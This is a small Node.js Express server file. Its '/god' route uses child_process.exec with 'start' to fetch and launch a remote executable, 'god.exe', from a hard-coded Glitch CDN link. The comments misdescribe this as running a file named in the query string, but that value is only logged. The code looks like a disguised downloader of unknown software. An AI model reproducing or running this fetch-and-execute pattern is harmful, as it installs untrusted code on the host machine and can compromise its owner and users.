

const express = require('express');
const { exec } = require('child_process');
const app = express();

app.get('/god', (req, res) => {
  // Get the name of the file to execute from the request query string
  const fileName = req.query.fileName;
  const fileUrl = 'https://cdn.glitch.me/90766488-81f4-448e-b0b0-621940538862/god.exe?v=1677181792468';

  // Execute the file using child_process.exec
  exec(`start ${fileUrl}`, (err, stdout, stderr) => {
    if (err) {
      console.error(`Error executing file: ${err}`);
      return res.status(500).send('Error executing file');
    }

    console.log(`File ${fileName} executed successfully`);
    res.send('File executed successfully');
  });
});
app.post('/', (req, res) => {
  res.send('🙂');
});